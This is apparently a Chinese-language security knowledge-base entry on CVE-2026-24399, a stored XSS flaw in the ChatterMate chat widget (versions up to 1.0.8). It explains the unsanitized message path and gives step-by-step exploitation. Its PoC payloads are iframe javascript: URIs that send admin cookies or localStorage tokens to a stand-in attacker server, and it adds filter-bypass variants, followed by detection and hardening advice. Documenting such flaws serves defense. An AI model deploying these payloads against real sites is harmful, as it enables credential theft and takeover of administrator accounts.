---
id: web-generic-xss-chattermate-widget-message-stored-xss
title: ChatterMate <=1.0.8 存储型 XSS：widget 聊天消息未过滤落库，后台会话查看触发 iframe javascript URI 窃取管理员凭据（CVE-2026-24399）
type: scenario
domain: web
path: web/generic/xss
technique: chattermate-widget-message-stored-xss
tags:
- web
- xss
- stored-xss
- ai
- chatbot
- iframe
- cookie-theft
- cve
cve:
- CVE-2026-24399
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ChatterMate <= 1.0.8（1.0.9 修复）
verification:
  verified_by: verifier-V164
  verified_at: '2026-11-06T10:01:04+08:00'
  notes: 已对照原文与图 01-07 核对：NVD CVE-2026-24399（CNA GitHub 9.3 Critical、1.0.8 及以下、1.0.9 修复）、widget_chat.handle_widget_chat 的 message=data.get('message','').strip()、ChatAgent.get_response → ChatRepository.create_message → ChatHistory(**message_data) 落库、chat_history.message=Column(String) 无内容校验、修复 commit a771d5 新增 decode_entities + dangerous_patterns(javascript/data/vbscript/file/about) + dangerous_tags 黑名单及前端 DOMPurify 配置，均一致。affected_versions 已按原文标记设置。未验证点：原文无实时窃取截图，PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/xss/web-generic-xss-chattermate-widget-message-stored-xss/
draft: false
kb_aliases:
- CVE-2026-24399
- ChatterMate 存储型 XSS
- iframe javascript: URI
- AI 聊天机器人 XSS
- widget_chat 存储型 XSS
---

## 一句话结论

ChatterMate 1.0.8 及以下的 widget 聊天入口把用户消息原样写入 `chat_history.message`，后端调用链（`handle_widget_chat` → `ChatAgent.get_response` → `ChatRepository.create_message` → `ChatHistory`）没有任何 HTML/JS 过滤；攻击者提交带 `javascript:` URI 的 `<iframe>` 等 payload，管理员在后台查看会话时浏览器执行该 URI，读取 `localStorage` 中的令牌与 Cookie 并外带，形成存储型 XSS（CVE-2026-24399，CVSS 9.3）。

## 原理

- **入口**：`backend/app/api/widget_chat.py` 的 `handle_widget_chat` 从 socket 事件取 `message = data.get('message', '').strip()`，只做去空格，没有做 HTML 实体解码或标签过滤。
- **落库**：消息传入 `ChatAgent.get_response(message=...)`；`get_response` 调用 `ChatRepository.create_message({... "message": message ...})`；`create_message` 直接 `ChatHistory(**message_data)` 并 `db.add/commit`。
- **模型**：`backend/app/models/chat_history.py` 中 `message = Column(String, nullable=False)` 只定义类型，没有校验内容；因此恶意 HTML/JS 原样进入数据库。
- **触发**：管理员/客服在后台打开该会话，前端把 `message` 当作富文本/HTML 渲染（或未充分净化），`<iframe src="javascript:...">` 的 `javascript:` URI 在浏览器上下文执行；脚本可读 `document.cookie`、`localStorage` 中的会话/网关令牌，并发送到攻击者服务器。
- **为什么是存储型**：payload 不在提交时执行，而是持久化后由另一名高权限用户查看时执行，因此可以绕过只针对“当前用户”的防护，直接打管理员。
- **修复**：1.0.9 在后端 `sanitize.py` 增加 `dangerous_tags` 黑名单（script/iframe/frame/object/embed/svg/math/form/input/a/img 等），先对消息做 HTML 实体解码，再检测 `javascript:`、`data:`、`vbscript:`、`file:`、`about:` 等危险协议；前端同时用 DOMPurify 的 `FORBID_TAGS`/`FORBID_ATTR`/`ALLOWED_TAGS`/`ALLOWED_ATTR` 与 `uponSanitizeElement`、`afterSanitizeAttributes` 做双层净化。

## 触发条件

- 目标 ChatterMate 版本 <= 1.0.8（1.0.9 修复）。
- 攻击者能向 widget 聊天入口发送消息（公开网站嵌入的聊天 widget 通常允许匿名/带 conversation token 访问）。
- 管理员或客服会在后台查看该会话记录，且前端将消息渲染为 HTML（或净化不完整）。
- 管理员会话的 Cookie 未设置 HttpOnly，或令牌存放在 `localStorage` 等 JS 可读位置。

## 利用步骤

1. 找到目标站点嵌入的 ChatterMate widget，建立会话（按页面流程获取 conversation token）。
2. 发送带 `javascript:` URI 的 iframe payload：
   ```html
   <iframe src="javascript:fetch('https://attacker-server.com/steal?data='+encodeURIComponent(document.cookie))">
   ```
3. 等待管理员在后台打开该会话；payload 在管理员浏览器执行，攻击者服务器收到 Cookie/令牌。
4. 若 `document.cookie` 受 HttpOnly 保护，改写 payload 读取 `localStorage`/`sessionStorage` 中的 token：
   ```html
   <iframe src="javascript:fetch('https://attacker-server.com/steal?data='+encodeURIComponent(JSON.stringify(localStorage)))">
   ```
5. 用窃取到的管理员会话/令牌登录后台，接管 AI Agent 配置、知识库、API Key 等。
6. 若目标有基础过滤，尝试 HTML 实体编码、大小写混写、`<svg onload>`、`<img src=x onerror>` 等变体。

## PoC

```html
<iframe src="javascript:fetch('https://attacker-server.com/steal?data='+encodeURIComponent(document.cookie))">
```

```html
<!-- localStorage 版本 -->
<iframe src="javascript:fetch('https://attacker-server.com/steal?data='+encodeURIComponent(JSON.stringify(localStorage)))">
```

```text
攻击者服务器侧：
GET /steal?data=session%3D...%3B%20token%3D...
→ 用该 Cookie/Token 访问 ChatterMate 后台
```

## 变体与关联

- 其它 HTML 注入点：`<img src=x onerror=...>`、`<svg onload=...>`、`<math><mtext><script>`、`<a href="javascript:...">`；修复黑名单虽然覆盖了很多标签，但黑名单本身容易被新标签/畸形嵌套绕过，白名单净化更可靠。
- 若消息在 Markdown 渲染器中处理，可尝试 `[x](javascript:...)`、HTML 混排、实体编码绕过。
- 同类 AI 聊天机器人存储型 XSS：消息落库 → 后台会话查看 → 管理员浏览器执行；与“AI 输出未过滤直接 innerHTML”属于同一类信任边界错误。
- 关联：[[web-generic-xss-dify-echarts-new-function-workspace-takeover]]（AI 平台前端 XSS 接管 workspace）、[[web-generic-xss-admin-blind-stored-registration]]（后台盲打存储型 XSS）。
- 边界：若目标已升级到 1.0.9+、前端使用严格白名单净化且 Cookie 为 HttpOnly、令牌不在 localStorage，利用难度显著提高；文章未给出实时窃取截图，但 CVE 公告与修复提交确认了该链路。

## 检测与防御

- 检测：审计聊天 widget 的消息落库路径，确认 `message` 是否在存储前/渲染前做 HTML 净化；搜索前端对 `message` 使用 `v-html`/`innerHTML`/`dangerouslySetInnerHTML` 的位置；对含 `<iframe`、`javascript:`、`onerror`、`onload` 的消息告警。
- 修复：升级到 1.0.9+；后端在落库前做 HTML 实体解码 + 标签/属性白名单（不要只靠黑名单）；前端用 DOMPurify 白名单模式渲染，禁止 `javascript:`/`data:` URI 与 `on*` 事件属性。
- 加固：管理员 Cookie 设置 `HttpOnly`/`Secure`/`SameSite`，敏感令牌不落 localStorage；部署 CSP（禁止 `unsafe-inline`、限制 `frame-src`/`connect-src`）；后台会话查看页与用户内容渲染域隔离。
